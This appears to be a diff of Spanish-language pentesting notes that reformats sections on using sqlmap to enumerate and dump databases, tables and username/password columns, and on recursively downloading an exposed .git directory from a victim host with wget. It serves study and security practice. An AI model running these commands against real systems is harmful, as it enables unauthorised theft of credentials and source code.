@@ -189,7 +189,7 @@ Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir
 ❯ sqlmap -u 'http://site.com/index.php?id=1'    # Necesitamos pasarle la URL en donde se encuentra el index.php con el parametro 'id' existente. 
 
 
-Cuando mires en una maquina victima el directorio **/.git/** quiere decir que se ha clonado un directorio Git y puede suponer un riesgo, porque si tiene la capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 
+Cuando mires en una maquina victima el directorio /.git/ quiere decir que se ha clonado un directorio Git y puede suponer un riesgo, porque si tiene la capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 
 
 
 ❯ wget -r http://192.168.68.11           # Nos descargarnos de forma recursiva el contenido del dir .git
@@ -274,9 +274,8 @@ Cuando mires en una maquina victima el directorio **/.git/** quiere decir que se
 	# dbs = Me muestre todas las bases de datos existentes (Dumpear)
 ```
 
-Una vez obtenidas las DBs podemos apuntar a las **tablas** de una base especifica
-
 ```bash
+# Una vez obtenidas las DBs se muestran las tablas 
 ❯ sqlmap -r example.req -p searchitem -D sqltraining --tables
 
 	# r = File con el contenido del Proxy de BurpSuite .req
@@ -286,9 +285,8 @@ Una vez obtenidas las DBs podemos apuntar a las **tablas** de una base especific
 	# tables = Queremos que nos muestre las tablas de la DB que elegimos 
 ```
 
-Una vez obtenidas las tablas, ahora vamos a querer que nos enumere las **columnas**
-
 ```bash
+# Una vez obtenidas las tablas se muestran las columnas 
 ❯ sqlmap -r example.req -p searchitem -D sqltraining -T users --columns
 
 	# r = File con el contenido del Proxy de BurpSuite .req
@@ -299,9 +297,8 @@ Una vez obtenidas las tablas, ahora vamos a querer que nos enumere las **columna
 	# columns = Queremos que nos muestre las columnas de la DB que elegimos 
 ```
 
-Una vez obtenidas las columnas podemos hacer que nos muestre **(Dumpear)** sus valores
-
 ```bash
+# Una vez obtenidas las columnas se puede dumpear los valores 
 ❯ sqlmap -r example.req -p searchitem -D sqltraining -T users -C username,password --dump
 
 	# r = File con el contenido del Proxy de BurpSuite .req
